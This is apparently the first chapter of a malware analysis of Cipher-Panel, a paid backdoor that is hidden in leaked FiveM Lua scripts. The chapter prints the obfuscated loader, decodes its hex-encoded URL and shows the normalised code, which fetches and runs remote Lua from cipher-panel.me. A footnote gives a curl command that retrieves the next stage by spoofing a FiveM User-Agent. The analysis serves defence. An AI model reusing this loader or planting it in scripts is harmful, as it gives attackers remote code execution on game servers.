## Chapter 1 (Payload)
This chapter covers the payload code used in the malicious code to hire dubbed Cipher-Panel.

### Introduction
The payload for this malicious software is provided to users who pay for access that in turn allows them to generate the payload code. Using this payload code they can then download FiveM scripts, modify them to include the payload code, and then upload them to popular FiveM script leaking websites and communities or even used by script developers and merchants to target specific servers.

#### Original Code
```lua
    local Enchanced_Tabs = {
        Ench, Support, Host, Pairs,
        Realease, Callbacks, Source,
        Hosting, Event, PerformHttpRequest,
        assert, server, load, Spawn, materials
    }

    local random_char = {
        '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
        '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f'; '69',
        '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'
    }

    function str_utf8()
        _empt = ''
        for id,it in pairs(random_char) do
            _empt = _empt..it
        end
        return (_empt:gsub('..', function (cc)
            return string.char(tonumber(cc, 16))
            
        end))
    end

    Enchanced_Tabs[10](str_utf8(), function (e, d)
        local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
        if (d == nil) then return end
        s()
    end)
```
It should be noted that the `random_char` array is unique to the user who created the payload via Cipher-Panel's website and thus is, __not__ something that is to be be used for the detection of this malicious software.

The code above is designed to look non-malicious by using field names that aren't normally associated with malicious code such as **random_char** and encoding characters with UTF-8 to prevent people from simply opening the script to check it's purpose.

The first stage to reversing this code is turning the `Enchanced_Tabs` array back into plain text by decoding the UTF-8 characters, followed by normalizing some of the function names and fields.

#### UTF-8 Array Reversal
```
Input: '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72', '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f'; '69', '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'
Normalized: \x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x69\x3f\x74\x6f\x3d\x6c\x36\x54\x72\x32
Output: https://cipher-panel.me/_i/i?to=l6Tr2
```

#### Function Name Array Mapping
```diff
Enchanced_Tabs[1] = Ench; (Junk Code)
Enchanced_Tabs[2] = Support; (Junk Code)
Enchanced_Tabs[3] = Host; (Junk Code)
Enchanced_Tabs[4] = Pairs; (Junk Code)
Enchanced_Tabs[5] = Realease; (Junk Code)
Enchanced_Tabs[6] = Callbacks; (Junk Code)
Enchanced_Tabs[7] = Source; (Junk Code)
Enchanced_Tabs[8] = Hosting; (Junk Code)
Enchanced_Tabs[9] = Event; (Junk Code)
+ Enchanced_Tabs[10] = PerformHttpRequest;
+ Enchanced_Tabs[11] = assert;
Enchanced_Tabs[12] = server; (Junk Code)
+ Enchanced_Tabs[13] = load;
Enchanced_Tabs[14] = Spawn; (Junk Code)
Enchanced_Tabs[15] = materials; (Junk Code)
```

The `Enchanced_Tabs` array mainly contains junk functions and keywords to throw users off from the three highlighted functions that are used in the payload functions.

#### Final Mapped and Normalised Code
```lua
    PerformHttpRequest("https://cipher-panel.me/_i/i?to=l6Tr2", function (errorCode, responseBody)
        local payload = assert(load(responseBody))
        if (responseBody == nil) then return end
        payload()
    end)
```

After the mapping and normalization of the code, we can see that the code continuously makes an HTTP request to the unique Cipher-Panel endpoint.

All endpoints provided by Cipher-Panel are all protected with [Cloudflare](https://www.cloudflare.com/) using their [page rules](https://www.cloudflare.com/en-gb/features-page-rules/) system, this prevents access via regular browsers and only allows access to requests using the `User-Agent` provided via FiveM's [PerformHttpRequest](https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/PerformHttpRequest/) *(FXServer/PerformHttpRequest)*. We can bypass that limitation with a simple `curl`[^1] command, this outputs the code used in the next part of this malicious software and is covered in the next chapter.

[^1]: `curl https://cipher-panel.me/_i/i?to=l6Tr2 -A "FXServer/PerformHttpRequest"`

[Chapter 2 (Infection)](https://github.com/ericstolly/cipher/blob/main/chapters/chapter-2-infection.md)
